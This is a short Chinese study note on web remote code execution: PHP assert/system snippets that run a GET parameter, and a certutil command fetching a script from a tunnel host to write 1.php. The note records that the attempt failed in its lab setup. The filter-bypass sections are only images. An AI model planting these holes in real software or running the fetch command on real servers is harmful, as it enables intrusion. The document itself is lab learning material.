# WEB攻防-RCE代码&命令执行&过滤绕过&异或无字符&无回显方案&黑白盒挖掘

```
$code=$_GET['c'];
assert($code);
```

![image-20260102153507063](images/image-20260102153507063.png)

连接成功

<img src="images/image-20260102153606472.png" alt="image-20260102153606472" style="zoom: 67%;" />

```
$cmd=$_GET['c'];
system($cmd);    //命令执行
```

制作脚本文件名为1.txt

利用棱角社区文件下载([[~\]#棱角 ::Edge.Forum*](https://forum.ywhack.com/bountytips.php?download))

![image-20260102162744531](images/image-20260102162744531.png)

```
certutil.exe -urlcache -split -f https://studies-referral-acdbentity-actors.trycloudflare.com:80/1.txt 1.php
```

虽然代码中直接调用了 `system()` 执行外部命令，
 但由于 Web 服务运行账户受到系统安全策略限制，
 无法创建子进程，导致该命令执行点在当前环境下不可利用



## 关键字过滤

![image-20260102172644299](images/image-20260102172644299.png)

命令过滤

![image-20260102172818504](images/image-20260102172818504.png)

加解码

![image-20260102182924303](images/image-20260102182924303.png)

![image-20260102190531374](images/image-20260102190531374.png)
